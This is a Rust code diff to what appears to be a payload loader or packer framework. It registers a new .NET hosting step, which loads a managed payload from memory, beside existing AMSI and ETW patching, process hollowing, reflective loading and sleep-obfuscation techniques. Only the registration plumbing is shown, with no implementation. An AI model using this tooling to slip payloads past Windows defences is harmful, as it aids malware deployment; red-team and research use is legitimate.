@@ -8,6 +8,7 @@
 
 pub mod anti_debug;
 pub mod bouncer;
+pub mod dotnet_hosting;
 pub mod patch_amsi;
 pub mod patch_etw;
 pub mod process_hollowing;
@@ -76,6 +77,13 @@ pub enum RuntimeStep {
         #[serde(default)]
         params: process_hollowing::Params,
     },
+    /// .NET hosting: start the CLR in the current process and load the managed
+    /// payload as an assembly from memory.
+    DotnetHosting {
+        /// Technique parameters (none).
+        #[serde(default)]
+        params: dotnet_hosting::Params,
+    },
     /// Reflective loading: map the payload into the current process and run
     /// its entry point.
     ReflectiveLoading {
@@ -113,6 +121,7 @@ impl RuntimeStep {
             RuntimeStep::Bouncer { params } => params.render_fragment(strings),
             RuntimeStep::PatchAmsi { params } => params.render_fragment(strings),
             RuntimeStep::PatchEtw { params } => params.render_fragment(strings),
+            RuntimeStep::DotnetHosting { params } => params.render_fragment(strings),
             RuntimeStep::ProcessHollowing { params } => params.render_fragment_for(strings, format),
             RuntimeStep::ReflectiveLoading { params } => {
                 params.render_fragment_for(strings, format, export)
@@ -128,6 +137,7 @@ impl RuntimeStep {
             RuntimeStep::Bouncer { .. } => bouncer::DEF.name,
             RuntimeStep::PatchAmsi { .. } => patch_amsi::DEF.name,
             RuntimeStep::PatchEtw { .. } => patch_etw::DEF.name,
+            RuntimeStep::DotnetHosting { .. } => dotnet_hosting::DEF.name,
             RuntimeStep::ProcessHollowing { .. } => process_hollowing::DEF.name,
             RuntimeStep::ReflectiveLoading { .. } => reflective_loading::DEF.name,
             RuntimeStep::SleepObfuscation { .. } => sleep_obfuscation::DEF.name,
@@ -144,6 +154,7 @@ impl RuntimeStep {
             RuntimeStep::Bouncer { .. } => bouncer::DEF.category,
             RuntimeStep::PatchAmsi { .. } => patch_amsi::DEF.category,
             RuntimeStep::PatchEtw { .. } => patch_etw::DEF.category,
+            RuntimeStep::DotnetHosting { .. } => dotnet_hosting::DEF.category,
             RuntimeStep::ProcessHollowing { .. } => process_hollowing::DEF.category,
             RuntimeStep::ReflectiveLoading { .. } => reflective_loading::DEF.category,
             RuntimeStep::SleepObfuscation { .. } => sleep_obfuscation::DEF.category,
@@ -202,12 +213,15 @@ impl Stability {
 
 /// A capability the build host must provide for a technique.
 ///
-/// Variants are part of the metadata vocabulary; only the ones used by the
-/// currently-registered techniques are constructed.
+/// The architecture variants (`WindowsX64` / `WindowsX86`) gate which
+/// `build.output.arch` a technique can run under; `plan::validate` checks them
+/// against the plan. Variants are part of the metadata vocabulary; only the ones
+/// used by the currently-registered techniques are constructed.
 #[allow(dead_code)]
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum Capability {
     WindowsX64,
+    WindowsX86,
     KernelAccess,
     AdminRequired,
 }
@@ -251,6 +265,7 @@ pub struct TechniqueDef {
 /// All registered techniques.
 pub fn all() -> &'static [TechniqueDef] {
     &[
+        dotnet_hosting::DEF,
         process_hollowing::DEF,
         reflective_loading::DEF,
         patch_amsi::DEF,
